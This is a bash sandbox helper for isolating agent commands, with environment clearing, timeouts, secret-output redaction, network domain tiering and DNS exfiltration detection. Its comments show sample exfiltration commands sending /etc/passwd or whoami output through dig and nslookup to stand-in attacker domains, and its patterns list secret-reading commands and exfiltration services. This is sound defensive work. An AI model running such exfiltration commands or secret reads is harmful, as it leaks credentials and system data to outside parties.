#!/usr/bin/env bash
# sandbox-exec-helper.sh — Lightweight execution sandbox for tool/command isolation
# Commands: run | audit | config | help
#
# Wraps command execution with environment clearing, timeout enforcement,
# temp directory isolation, optional network restriction, and network tiering.
# Inspired by OpenFang's WASM sandbox — adapted for shell-native use.
#
# Network tiering (t1412.3): When --network-tiering is enabled, commands that
# access the network have their target domains classified into tiers (1-5).
# Tier 5 domains (exfiltration indicators) are logged and flagged. Tier 4
# (unknown) domains are allowed but flagged for post-session review.
# See network-tier-helper.sh for the full tier model.
#
# Usage:
#   sandbox-exec-helper.sh run command [args...]
#   sandbox-exec-helper.sh run --timeout 60 --no-network curl example.com
#   sandbox-exec-helper.sh run --network-tiering --worker-id w123 curl example.com
#   sandbox-exec-helper.sh run --allow-secret-io gopass show path  # explicit override
#   sandbox-exec-helper.sh run --passthrough "GITHUB_TOKEN,NPM_TOKEN" npm publish
#   sandbox-exec-helper.sh audit [--last N]
#   sandbox-exec-helper.sh config --show
#   sandbox-exec-helper.sh help
#
# Note: command and its arguments are passed as separate shell words (not a
# single quoted string). This avoids bash -c eval and correctly handles
# arguments containing spaces.

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)" || exit
# shellcheck source=shared-constants.sh
source "${SCRIPT_DIR}/shared-constants.sh"
set -euo pipefail

LOG_PREFIX="SANDBOX"

# =============================================================================
# Constants
# =============================================================================

readonly SANDBOX_DIR="${HOME}/.aidevops/.agent-workspace/sandbox"
readonly SANDBOX_LOG="${SANDBOX_DIR}/executions.jsonl"
readonly SANDBOX_TMP_BASE="${SANDBOX_DIR}/tmp"
readonly SANDBOX_DEFAULT_TIMEOUT=120
readonly SANDBOX_MAX_TIMEOUT=3600
readonly SANDBOX_MAX_OUTPUT_BYTES=10485760 # 10MB per stream
readonly SECRET_IO_GUARD_DEFAULT="true"

# Minimal environment passthrough — only what's needed for basic operation
readonly DEFAULT_PASSTHROUGH="PATH HOME USER LANG TERM SHELL"

# Network tier helper (t1412.3)
readonly NET_TIER_HELPER="${SCRIPT_DIR}/network-tier-helper.sh"

# Quarantine helper (t1428.4)
readonly QUARANTINE_HELPER="${SCRIPT_DIR}/quarantine-helper.sh"

# =============================================================================
# Helpers
# =============================================================================

log_sandbox() {
	local level="$1"
	local msg="$2"
	printf '[%s] [%s] [%s] %s\n' \
		"$(date -u +%Y-%m-%dT%H:%M:%SZ)" "$LOG_PREFIX" "$level" "$msg" >&2
}

# Log execution to JSONL audit trail
log_execution() {
	local command="$1"
	local exit_code="$2"
	local duration="$3"
	local timeout_used="$4"
	local network_blocked="${5:-false}"
	local passthrough_vars="${6:-}"
	local timestamp
	timestamp="$(date -u +%Y-%m-%dT%H:%M:%SZ)"

	mkdir -p "$(dirname "$SANDBOX_LOG")"

	# Truncate command for logging (no secrets, max 500 chars)
	local logged_cmd="${command:0:500}"

	# Use jq to safely generate the JSON log entry — prevents JSON/log injection
	# via backslashes, newlines, or other special characters in the command string.
	local log_entry
	log_entry=$(jq -n \
		--arg ts "$timestamp" \
		--arg cmd "$logged_cmd" \
		--argjson exit "$exit_code" \
		--argjson duration "$duration" \
		--argjson timeout "$timeout_used" \
		--argjson network_blocked "$network_blocked" \
		--arg passthrough "$passthrough_vars" \
		'{ts: $ts, cmd: $cmd, exit: $exit, duration_s: $duration, timeout: $timeout, network_blocked: $network_blocked, passthrough: $passthrough}')

	printf '%s\n' "$log_entry" >>"$SANDBOX_LOG"
	return 0
}

# Detect high-risk commands that could expose secret values in transcript output.
# Returns 0 and prints a reason when command should be blocked.
# Returns 1 when command appears safe.
_sandbox_secret_block_reason() {
	local command="$1"
	local normalized
	normalized="$(printf '%s' "$command" | tr '[:upper:]' '[:lower:]')"

	if [[ "$normalized" =~ (^|[[:space:];|&])(gopass|pass)[[:space:]]+(show|cat)([[:space:]]|$) ]]; then
		echo "password manager value read command"
		return 0
	fi

	if [[ "$normalized" =~ (^|[[:space:];|&])op[[:space:]]+read([[:space:]]|$) ]]; then
		echo "1Password secret read command"
		return 0
	fi

	if [[ "$normalized" =~ (^|[[:space:];|&])cat[[:space:]]+([^[:space:]]*/)?(\.env([^[:space:]]*)?|credentials\.sh|[^[:space:]]*secret[^[:space:]]*)($|[[:space:];|&]) ]]; then
		echo "file read command targeting likely secret material"
		return 0
	fi

	if [[ "$normalized" =~ (^|[[:space:];|&])(echo|printenv)[[:space:]]+\$?[a-z_][a-z0-9_]*(secret|token|key|password|passwd|pwd|credential|client_secret|access_token)([[:space:];|&]|$) ]]; then
		echo "environment variable value print command"
		return 0
	fi

	if [[ "$normalized" =~ (^|[[:space:];|&])env[[:space:]]*\|[[:space:]]*(grep|rg)([[:space:];|&]|$) ]]; then
		echo "environment dump piped to search command"
		return 0
	fi

	if [[ "$normalized" =~ (^|[[:space:];|&])kubectl[[:space:]]+get[[:space:]]+secret([[:space:]]|$) ]]; then
		echo "kubernetes secret read command"
		return 0
	fi

	if [[ "$normalized" =~ (^|[[:space:];|&])docker[[:space:]]+inspect([[:space:]]|$) ]] || [[ "$normalized" =~ (^|[[:space:];|&])docker[[:space:]]+exec[[:space:]].*[[:space:]]env([[:space:];|&]|$) ]]; then
		echo "docker environment inspection command"
		return 0
	fi

	if [[ "$normalized" =~ (^|[[:space:];|&])pm2[[:space:]]+env([[:space:]]|$) ]]; then
		echo "pm2 environment dump command"
		return 0
	fi

	return 1
}

# Determine whether command/output should be treated as secret-tainted.
# Tainted commands get stronger output handling (warning + redaction).
_sandbox_is_secret_tainted_command() {
	local command="$1"
	local normalized
	normalized="$(printf '%s' "$command" | tr '[:upper:]' '[:lower:]')"

	if _sandbox_secret_block_reason "$command" >/dev/null 2>&1; then
		return 0
	fi

	if [[ "$normalized" =~ oauth/access_token|client_secret|access_token|refresh_token|authorization:[[:space:]]*bearer ]]; then
		return 0
	fi

	return 1
}

# Redact likely secret values from a captured output file.
# Arguments: $1=file path, $2=stream name (stdout|stderr)
_sandbox_emit_redacted_output() {
	local output_file="$1"
	local stream_name="$2"
	local tainted_flag="$3"

	if [[ ! -f "$output_file" ]] || [[ ! -s "$output_file" ]]; then
		return 0
	fi

	local truncated_file
	truncated_file="$(mktemp)"
	head -c "$SANDBOX_MAX_OUTPUT_BYTES" "$output_file" >"$truncated_file"

	if [[ "$tainted_flag" == "true" ]]; then
		local warning_msg="[sandbox] WARNING: secret-tainted command detected — output is redacted"
		if [[ "$stream_name" == "stderr" ]]; then
			printf '%s\n' "$warning_msg" >&2
		else
			printf '%s\n' "$warning_msg"
		fi
	fi

	if command -v python3 >/dev/null 2>&1; then
		if [[ "$stream_name" == "stderr" ]]; then
			python3 - "$truncated_file" <<'PY' >&2
import os
import re
import sys

path = sys.argv[1]
try:
    text = open(path, "r", encoding="utf-8", errors="replace").read()
except Exception:
    sys.exit(0)

candidate_values = []
for key, value in os.environ.items():
    upper = key.upper()
    if any(token in upper for token in ["SECRET", "TOKEN", "PASSWORD", "API_KEY", "ACCESS_KEY", "PRIVATE_KEY", "CLIENT_SECRET", "AUTH"]):
        if value and len(value) >= 8:
            candidate_values.append(value)

for value in sorted(set(candidate_values), key=len, reverse=True):
    text = text.replace(value, "[REDACTED_SECRET]")

patterns = [
    (re.compile(r'(?i)(authorization\s*:\s*bearer\s+)([A-Za-z0-9._~+/=-]+)'), r'\1[REDACTED_SECRET]'),
    (re.compile(r'(?i)(access_token|refresh_token|client_secret|api[_-]?key|password|token|secret)(\s*[:=]\s*)("?[^"\s,}]+"?)'), r'\1\2"[REDACTED_SECRET]"'),
]

for pattern, repl in patterns:
    text = pattern.sub(repl, text)

sys.stdout.write(text)
PY
		else
			python3 - "$truncated_file" <<'PY'
import os
import re
import sys

path = sys.argv[1]
try:
    text = open(path, "r", encoding="utf-8", errors="replace").read()
except Exception:
    sys.exit(0)

candidate_values = []
for key, value in os.environ.items():
    upper = key.upper()
    if any(token in upper for token in ["SECRET", "TOKEN", "PASSWORD", "API_KEY", "ACCESS_KEY", "PRIVATE_KEY", "CLIENT_SECRET", "AUTH"]):
        if value and len(value) >= 8:
            candidate_values.append(value)

for value in sorted(set(candidate_values), key=len, reverse=True):
    text = text.replace(value, "[REDACTED_SECRET]")

patterns = [
    (re.compile(r'(?i)(authorization\s*:\s*bearer\s+)([A-Za-z0-9._~+/=-]+)'), r'\1[REDACTED_SECRET]'),
    (re.compile(r'(?i)(access_token|refresh_token|client_secret|api[_-]?key|password|token|secret)(\s*[:=]\s*)("?[^"\s,}]+"?)'), r'\1\2"[REDACTED_SECRET]"'),
]

for pattern, repl in patterns:
    text = pattern.sub(repl, text)

sys.stdout.write(text)
PY
		fi
	else
		if [[ "$stream_name" == "stderr" ]]; then
			cat "$truncated_file" >&2
		else
			cat "$truncated_file"
		fi
	fi

	rm -f "$truncated_file"
	return 0
}

# =============================================================================
# Network Tiering Integration (t1412.3)
# =============================================================================

# Extract domains from a command string and check them against network tiers.
# Best-effort heuristic: parses URLs and hostnames from common patterns
# (curl, wget, git clone, npm install from URL, etc.).
# Arguments:
#   $1 - command string
#   $2 - worker ID for logging
_sandbox_check_network_tiers() {
	local command="$1"
	local wid="$2"

	# --- DNS exfiltration shape detection (t1428.1, CVE-2025-55284) ---
	# Check for DNS tool usage with dynamic data BEFORE domain extraction.
	# DNS exfil encodes stolen data as subdomain labels — the destination
	# domain is often attacker-controlled and unknown to our tier list.
	# Detecting the command SHAPE catches exfil regardless of destination.
	_sandbox_check_dns_exfil "$command" "$wid"

	# Extract potential domains from the command using multiple strategies:
	# 1. Full URLs: https://domain.com/... or http://domain.com/...
	# 2. Bare hostnames after networking tools: curl example.com, wget host.io
	# 3. Git SSH patterns: git@github.com:user/repo.git
	# 4. SCP-style: scp file user@host.example.com:/path
	# 5. DNS tools: dig domain.com, nslookup domain.com, host domain.com
	# Excludes: @scope/package (npm), single-label names (localhost, etc.)
	local domains=""
	local url_domains bare_domains git_ssh_domains dns_domains

	# Strategy 1: Extract domains from http(s) URLs
	url_domains="$(printf '%s' "$command" | grep -oE 'https?://[a-zA-Z0-9._-]+' | sed -E 's|https?://||')" || true

	# Strategy 2: Extract bare hostnames after networking tools that take a URL/host
	# as their primary argument (curl, wget, etc.). Tools where arguments are mixed
	# (scp, rsync) are handled by Strategy 3 via user@host patterns instead.
	# Requires TLD of 2+ alpha chars to avoid matching filenames like "file.txt"
	# and excludes common file extensions (.sh, .py, .js, .json, .txt, .log, .yml, .yaml, .md, .conf)
	bare_domains="$(printf '%s' "$command" | grep -oE '(curl|wget|fetch|nc|ncat|telnet)\s+(-[a-zA-Z0-9]+\s+)*([a-zA-Z0-9]([a-zA-Z0-9_-]*\.)+[a-zA-Z]{2,})' | grep -oE '[a-zA-Z0-9]([a-zA-Z0-9_-]*\.)+[a-zA-Z]{2,}$' | grep -vE '\.(sh|py|js|ts|json|txt|log|yml|yaml|md|conf|cfg|xml|html|css|gz|tar|zip)$')" || true

	# Strategy 3: Extract hosts from user@host patterns (git SSH, ssh, scp, etc.)
	# Matches both git@github.com:user/repo and user@server.example.com
	git_ssh_domains="$(printf '%s' "$command" | grep -oE '[a-zA-Z0-9_-]+@([a-zA-Z0-9]([a-zA-Z0-9_-]*\.)+[a-zA-Z]{2,})' | sed 's/.*@//')" || true

	# Strategy 4 (t1428.1): Extract domains from DNS tool arguments
	# Catches: dig example.com, nslookup evil.io, host attacker.net
	# Strips flags (dig +short, dig @resolver), trailing dots (FQDN notation),
	# and record types (A, AAAA, TXT, MX, etc.)
	dns_domains="$(printf '%s' "$command" | grep -oE '\b(dig|nslookup|host)\s+[^|;&]*' | sed -E 's/\b(dig|nslookup|host)\s+//' | grep -oE '[a-zA-Z0-9]([a-zA-Z0-9_-]*\.)+[a-zA-Z]{2,}\.?' | sed 's/\.$//' | grep -vE '^\$|^`')" || true

	# Combine and deduplicate all extracted domains
	domains="$(printf '%s\n%s\n%s\n%s' "$url_domains" "$bare_domains" "$git_ssh_domains" "$dns_domains" | grep -v '^$' | sort -u)" || true

	if [[ -z "$domains" ]]; then
		return 0
	fi

	local domain tier_result
	while IFS= read -r domain; do
		[[ -z "$domain" ]] && continue
		tier_result="$("$NET_TIER_HELPER" classify "$domain")" || true

		if [[ "$tier_result" == "5" ]]; then
			log_sandbox "WARN" "Network tier DENY: ${domain} (Tier 5 — exfiltration indicator)"
			"$NET_TIER_HELPER" log-access "$domain" "$wid" "pre-check-deny" || true
			# Quarantine denied domains for review — user may want to allow (t1428.4)
			if [[ -x "$QUARANTINE_HELPER" ]]; then
				"$QUARANTINE_HELPER" add \
					--source sandbox-exec \
					--severity HIGH \
					--category denied_domain \
					--content "$domain" \
					--worker-id "$wid" \
					>/dev/null 2>&1 || true
			fi
		elif [[ "$tier_result" == "4" ]]; then
			log_sandbox "INFO" "Network tier FLAG: ${domain} (Tier 4 — unknown domain)"
			# Note: Tier 4 quarantine is handled by network-tier-helper.sh log_access
			"$NET_TIER_HELPER" log-access "$domain" "$wid" "pre-check-flag" || true
		else
			# Tiers 1-3: log silently (tier helper handles routing)
			"$NET_TIER_HELPER" log-access "$domain" "$wid" "pre-check-allow" || true
		fi
	done <<<"$domains"

	return 0
}

# Detect DNS exfiltration command shapes (t1428.1, CVE-2025-55284).
# DNS exfil encodes stolen data as subdomain labels in DNS queries:
#   dig $(cat /etc/passwd | base64).attacker.com
#   nslookup $(whoami).evil.example
#   echo "secret" | base64 | xargs -I{} dig {}.attacker.com
# These bypass HTTP-layer controls because DNS resolution is typically
# unrestricted. Existing Tier 5 blocks known exfil services but not
# attacker-owned domains. This function catches the command SHAPE.
# Arguments:
#   $1 - command string
#   $2 - worker ID for logging
_sandbox_check_dns_exfil() {
	local command="$1"
	local wid="$2"
	local dns_exfil_detected=false

	# Pattern 1: DNS tool with command substitution ($(...), ${...}, `...`)
	if printf '%s' "$command" | grep -qE '\b(dig|nslookup|host)\b.*(\$\(|\$\{|`)'; then
		log_sandbox "CRIT" "DNS EXFIL DETECTED: DNS tool with command substitution (worker=${wid})"
		dns_exfil_detected=true
	fi

	# Pattern 2: base64/encoding piped to DNS tool
	if printf '%s' "$command" | grep -qE '\b(base64|xxd|od[[:space:]]+-[AaxX]|hexdump)\b.*\|[[:space:]]*(dig|nslookup|host)\b'; then
		log_sandbox "CRIT" "DNS EXFIL DETECTED: Encoded data piped to DNS tool (worker=${wid})"
		dns_exfil_detected=true
	fi

	# Pattern 3: DNS tool inside a loop (bulk exfil)
	if printf '%s' "$command" | grep -qE '\b(for|while)\b.*\b(dig|nslookup|host)\b.*\bdone\b'; then
		log_sandbox "CRIT" "DNS EXFIL DETECTED: DNS tool inside loop construct (worker=${wid})"
		dns_exfil_detected=true
	fi

	# Pattern 4: DNS-over-HTTPS with dynamic data
	if printf '%s' "$command" | grep -qE '(dns-query|dns\.google|cloudflare-dns\.com/dns-query|doh\.).*(\$\(|\$\{|`)'; then
		log_sandbox "CRIT" "DNS EXFIL DETECTED: DNS-over-HTTPS with dynamic data (worker=${wid})"
		dns_exfil_detected=true
	fi

	# Pattern 5: Known DNS exfiltration service domains
	# These are attacker-controlled DNS logging services. Any DNS query or
	# HTTP request to these domains is a strong exfil indicator.
	if printf '%s' "$command" | grep -qiE '\b(dnslog\.cn|ceye\.io|interact\.sh|burpcollaborator\.net|oastify\.com|oast\.(fun|me|live))\b'; then
		log_sandbox "CRIT" "DNS EXFIL DETECTED: Known exfiltration service domain (worker=${wid})"
		dns_exfil_detected=true
	fi

	if [[ "$dns_exfil_detected" == true ]]; then
		# Log to audit trail if available
		local audit_helper="${SCRIPT_DIR}/audit-log-helper.sh"
		if [[ -x "$audit_helper" ]]; then
			"$audit_helper" log security.event \
				"DNS exfiltration command shape detected" \
				--detail "worker=${wid}" \
				--detail "command=${command:0:200}" 2>/dev/null || true
		fi
	fi

	return 0
}

# =============================================================================
# Sandbox Execution
# =============================================================================

sandbox_run() {
	local timeout_secs="$SANDBOX_DEFAULT_TIMEOUT"
	local block_network=false
	local network_tiering=false
	local allow_secret_io=false
	local worker_id="sandbox-$$"
	local extra_passthrough=""
	local secret_io_guard="${AIDEVOPS_BLOCK_SECRET_IO:-$SECRET_IO_GUARD_DEFAULT}"

	# Capture command and its arguments as an array to avoid bash -c eval risks:
	# - Preserves arguments with spaces correctly (no word-splitting on expansion)
	# - Eliminates shell injection via unquoted arguments
	# - Avoids the eval-equivalent behaviour of bash -c "$string"
	local -a cmd_args=()

	# Parse arguments
	while [[ $# -gt 0 ]]; do
		case $1 in
		--timeout)
			timeout_secs="$2"
			if ((timeout_secs > SANDBOX_MAX_TIMEOUT)); then
				log_sandbox "WARN" "Timeout capped at ${SANDBOX_MAX_TIMEOUT}s (requested ${timeout_secs}s)"
				timeout_secs=$SANDBOX_MAX_TIMEOUT
			fi
			shift 2
			;;
		--no-network)
			block_network=true
			shift
			;;
		--network-tiering)
			network_tiering=true
			shift
			;;
		--allow-secret-io)
			allow_secret_io=true
			shift
			;;
		--worker-id)
			worker_id="$2"
			shift 2
			;;
		--passthrough)
			extra_passthrough="$2"
			shift 2
			;;
		--)
			shift
			cmd_args=("$@")
			break
			;;
		*)
			cmd_args=("$@")
			break
			;;
		esac
	done

	if [[ ${#cmd_args[@]} -eq 0 ]]; then
		log_sandbox "ERROR" "No command provided"
		return 1
	fi

	# For pattern-matching helpers (secret guard, taint check, network tiering),
	# pass a space-joined string representation — these functions do text matching
	# only and do not execute the command.
	local cmd_str="${cmd_args[*]}"

	if [[ "$secret_io_guard" == "true" ]] && [[ "$allow_secret_io" != "true" ]]; then
		local block_reason
		if block_reason="$(_sandbox_secret_block_reason "$cmd_str")"; then
			log_sandbox "ERROR" "Blocked command due to secret leak risk: ${block_reason}"
			log_sandbox "ERROR" "Use --allow-secret-io only for explicit user-approved local operations"
			log_execution "$cmd_str" 126 0 "$timeout_secs" "$block_network" "$extra_passthrough"
			return 126
		fi
	fi

	# Create isolated temp directory
	local exec_id
	exec_id="$(date +%s)-$$"
	local exec_tmpdir="${SANDBOX_TMP_BASE}/${exec_id}"
	mkdir -p "$exec_tmpdir"

	# Build environment — start with env -i then add vars
	local -a env_args=("env" "-i")

	# Add default passthrough vars (only if they exist in current env)
	local var
	for var in $DEFAULT_PASSTHROUGH; do
		if [[ -n "${!var:-}" ]]; then
			env_args+=("${var}=${!var}")
		fi
	done

	# Override TMPDIR to isolated directory
	env_args+=("TMPDIR=${exec_tmpdir}")

	# Add extra passthrough vars
	if [[ -n "$extra_passthrough" ]]; then
		local extra_var
		while IFS= read -r extra_var; do
			# trim whitespace
			extra_var="${extra_var#"${extra_var%%[![:space:]]*}"}"
			extra_var="${extra_var%"${extra_var##*[![:space:]]}"}"
			if [[ -n "${!extra_var:-}" ]]; then
				env_args+=("${extra_var}=${!extra_var}")
			else
				log_sandbox "WARN" "Passthrough var '${extra_var}' not set in environment, skipping"
			fi
		done < <(printf '%s\n' "$extra_passthrough" | tr ',' '\n')
	fi

	# Capture output files
	local stdout_file="${exec_tmpdir}/stdout"
	local stderr_file="${exec_tmpdir}/stderr"

	log_sandbox "INFO" "Executing (timeout=${timeout_secs}s, network_blocked=${block_network}, tiering=${network_tiering}): ${cmd_str:0:200}"

	# Network tiering pre-check (t1412.3): extract domains from the command
	# and check them against the tier classification before execution.
	# This is a best-effort heuristic — it catches obvious cases like
	# "curl evil.ngrok.io" but cannot intercept runtime DNS resolution.
	# The primary value is logging + post-session review, not hard blocking.
	if [[ "$network_tiering" == true ]] && [[ -x "$NET_TIER_HELPER" ]]; then
		_sandbox_check_network_tiers "$cmd_str" "$worker_id"
	fi

	local start_time
	start_time="$(date +%s)"
	local exit_code=0
	local command_tainted=false
	if _sandbox_is_secret_tainted_command "$cmd_str"; then
		command_tainted=true
	fi

	# Execute with timeout and clean environment.
	# cmd_args is expanded as an array — each element is a separate argument,
	# preserving spaces and avoiding any additional shell interpretation.
	if [[ "$block_network" == true ]] && command -v sandbox-exec &>/dev/null; then
		# macOS seatbelt: deny network access.
		# sandbox-exec accepts program + args directly (no shell wrapper needed).
		local seatbelt_profile="(version 1)(allow default)(deny network*)"
		timeout_sec "$timeout_secs" \
			sandbox-exec -p "$seatbelt_profile" \
			"${env_args[@]}" \
			"${cmd_args[@]}" \
			>"$stdout_file" 2>"$stderr_file" || exit_code=$?
	else
		if [[ "$block_network" == true ]]; then
			log_sandbox "WARN" "Network blocking requested but sandbox-exec not available (non-macOS); proceeding without"
		fi
		timeout_sec "$timeout_secs" \
			"${env_args[@]}" \
			"${cmd_args[@]}" \
			>"$stdout_file" 2>"$stderr_file" || exit_code=$?
	fi

	local end_time
	end_time="$(date +%s)"
	local duration=$((end_time - start_time))

	# Handle timeout (exit code 124 from timeout command)
	if [[ $exit_code -eq 124 ]]; then
		log_sandbox "WARN" "Command timed out after ${timeout_secs}s"
	fi

	# Output results with redaction and taint-aware handling
	_sandbox_emit_redacted_output "$stdout_file" "stdout" "$command_tainted"
	_sandbox_emit_redacted_output "$stderr_file" "stderr" "$command_tainted"

	# Audit log
	log_execution "$cmd_str" "$exit_code" "$duration" "$timeout_secs" "$block_network" "$extra_passthrough"

	# Async cleanup of old temp dirs (older than 60 minutes).
	# stderr is not suppressed so permission errors or other persistent failures
	# remain visible for debugging rather than silently consuming disk space.
	find "$SANDBOX_TMP_BASE" -maxdepth 1 -type d -mmin +60 -exec rm -rf {} + &

	return "$exit_code"
}

# =============================================================================
# Audit
# =============================================================================

sandbox_audit() {
	local last_n=20

	while [[ $# -gt 0 ]]; do
		case $1 in
		--last)
			last_n="$2"
			shift 2
			;;
		*) shift ;;
		esac
	done

	if [[ ! -f "$SANDBOX_LOG" ]]; then
		echo "No sandbox executions logged yet."
		return 0
	fi

	echo "Last ${last_n} sandboxed executions:"
	echo "---"
	# Single jq call per line extracts all four fields at once via @tsv,
	# replacing four separate jq invocations and significantly reducing overhead
	# for large log files.
	tail -n "$last_n" "$SANDBOX_LOG" | while IFS= read -r line; do
		local ts cmd exit_code duration
		IFS=$'\t' read -r ts cmd exit_code duration < <(
			printf '%s' "$line" | jq -r '[.ts, .cmd, .exit, .duration_s] | map(. // "?") | @tsv'
		)
		# Truncate command display to 80 chars
		cmd="${cmd:0:80}"
		printf '%s  exit=%s  %ss  %s\n' "$ts" "$exit_code" "$duration" "$cmd"
	done
	return 0
}

# =============================================================================
# Config
# =============================================================================

sandbox_config() {
	echo "Sandbox configuration:"
	echo "  Log:          ${SANDBOX_LOG}"
	echo "  Tmp base:     ${SANDBOX_TMP_BASE}"
	echo "  Timeout:      ${SANDBOX_DEFAULT_TIMEOUT}s (max ${SANDBOX_MAX_TIMEOUT}s)"
	echo "  Max output:   $((SANDBOX_MAX_OUTPUT_BYTES / 1048576))MB per stream"
	echo "  Secret guard: ${AIDEVOPS_BLOCK_SECRET_IO:-$SECRET_IO_GUARD_DEFAULT}"
	echo "  Passthrough:  ${DEFAULT_PASSTHROUGH}"
	echo "  Net tiering:  $([ -x "$NET_TIER_HELPER" ] && echo "available" || echo "not found")"
	echo ""
	if [[ -f "$SANDBOX_LOG" ]]; then
		local count
		count="$(wc -l <"$SANDBOX_LOG" | xargs)"
		echo "  Executions logged: ${count}"
	else
		echo "  Executions logged: 0"
	fi
}

# =============================================================================
# Help
# =============================================================================

sandbox_help() {
	cat <<'HELP'
sandbox-exec-helper.sh — Lightweight execution sandbox

Commands:
  run command [args...]      Execute command in sandboxed environment
  audit [--last N]           Show recent sandboxed executions
  config --show              Show sandbox configuration
  help                       Show this help

Run options:
  --timeout N                Timeout in seconds (default: 120, max: 3600)
  --no-network               Block network access (macOS only, uses seatbelt)
  --network-tiering          Enable domain classification and logging (t1412.3)
  --allow-secret-io          Bypass secret-output guard for this command only
  --worker-id ID             Worker identifier for network tier logs
  --passthrough "VAR1,VAR2"  Additional env vars to pass through

  Command and its arguments are passed as separate shell words — not a single
  quoted string. This correctly handles arguments containing spaces and avoids
  shell injection via bash -c evaluation.

Examples:
  sandbox-exec-helper.sh run ls -la /tmp
  sandbox-exec-helper.sh run --timeout 60 npm test
  sandbox-exec-helper.sh run --no-network python3 script.py
  sandbox-exec-helper.sh run --network-tiering --worker-id w123 curl https://api.github.com/repos
  sandbox-exec-helper.sh run --allow-secret-io gopass show aidevops/EXAMPLE
  sandbox-exec-helper.sh run --passthrough "GITHUB_TOKEN" gh pr list
  sandbox-exec-helper.sh audit --last 10

Security model:
  - Environment cleared (env -i) with minimal passthrough
  - Each execution gets isolated TMPDIR
  - Configurable timeout with hard kill
  - Secret-output command guard blocks likely credential leakage patterns
  - Optional network blocking (macOS seatbelt)
  - Network domain tiering: classify, log, flag unknown domains (t1412.3)
  - All executions logged to JSONL audit trail (jq-safe JSON, injection-proof)
  - Output capped at 10MB per stream
HELP
	return 0
}

# =============================================================================
# Main
# =============================================================================

main() {
	local cmd="${1:-help}"
	shift || true

	case "$cmd" in
	run) sandbox_run "$@" ;;
	audit) sandbox_audit "$@" ;;
	config) sandbox_config "$@" ;;
	help) sandbox_help ;;
	*)
		log_sandbox "ERROR" "Unknown command: ${cmd}"
		sandbox_help
		return 1
		;;
	esac
}

main "$@"
